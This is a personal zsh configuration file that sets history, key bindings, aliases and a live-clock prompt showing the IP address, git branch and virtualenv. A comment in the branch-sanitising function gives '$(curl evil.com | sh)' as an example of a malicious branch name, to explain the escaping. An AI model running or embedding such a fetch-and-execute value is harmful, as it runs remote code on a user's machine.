# ~/.zshrc

# ##### Completion #####
zstyle :compinstall filename "$HOME/.zshrc"
autoload -Uz compinit
compinit

# ##### History
HISTFILE=~/.histfile
HISTSIZE=10000
SAVEHIST=10000
setopt HIST_IGNORE_DUPS       # don't record consecutive duplicates
setopt SHARE_HISTORY          # share history across sessions
setopt INC_APPEND_HISTORY     # append as commands run, not on exit

# ##### Shell behavior #####
setopt AUTO_CD                # type a dir name to cd into it
setopt CORRECT                # suggest corrections for mistyped commands
setopt INTERACTIVE_COMMENTS   # allow # comments in interactive shell

# ##### Key bindings triggers #####
_CLOCK_PAUSED=0

_toggle_clock() {
    # Active clock disables the prompt highlighting which makes copying impossible
    # This method disable/enables the clock.
    if [[ $_CLOCK_PAUSED -eq 0 ]]; then
        _CLOCK_PAUSED=1
    else
        _CLOCK_PAUSED=0
    fi
}
zle -N _toggle_clock

# ##### Key bindings #####
bindkey -e                    # emacs-style (use -v for vi)
bindkey "^[[1;5C" forward-word   # Ctrl + Right
bindkey "^[[1;5D" backward-word  # Ctrl + Left
bindkey '^P' _toggle_clock      # Ctrl + P 


# ##### Colors & aliases #####
autoload -U colors && colors
alias ls='ls --color=auto'
alias ll='ls -lah --color=auto'
alias grep='grep --color=auto'

# ##### Prompt with live clock #####
setopt PROMPT_SUBST           # enable ${...} and $(...) expansion in prompts

_PROMPT_IP="$(hostname -I 2>/dev/null | awk '{print $1}')"
: "${_PROMPT_IP:=127.0.0.1}"


source "/home/${USER}/mainvenv/bin/activate"
current_venv=''
_PROMPT_SINCE=""

get_venv_basename(){
    basename $VIRTUAL_ENV | sed 's/[$`(){};]/\\&/g'
}

preexec() {
    _PROMPT_SINCE="$(date '+%Y-%m-%d %H:%M:%S')"
    current_venv=${VIRTUAL_ENV:+($(get_venv_basename))}
}
precmd() {
    _PROMPT_SINCE="$(date '+%Y-%m-%d %H:%M:%S')"
    current_venv=${VIRTUAL_ENV:+($(get_venv_basename))}
}

TMOUT=1 
TRAPALRM() {
    [[ $_CLOCK_PAUSED -eq 0 ]] && zle && zle reset-prompt
}


clean_branch() {
    # sanatize and prints out the current git branch. Sanatizing is extremely important since we are running PROMPT_SUBST.
    # We don't want evil people to name branches $(curl evil.com | sh)
    git branch --show-current 2>/dev/null | sed 's/[$`(){}]/\\&/g'
}



# Setup the python virtual environment
export VIRTUAL_ENV_DISABLE_PROMPT=1

PROMPT=$'\n''%F{244}SINCE (%F{cyan}${_PROMPT_SINCE}%F{244}) UNTIL (%F{cyan}%D{%Y-%m-%d %H:%M:%S}%F{244}) - %F{green}%n@%m%f%F{244}[%F{yellow}${_PROMPT_IP}%f%F{244}] %F{magenta}[$(clean_branch)]%f
${current_venv} %F{blue}%~%f > $ '


export PATH="$PATH:/home/$USER/code/scripts"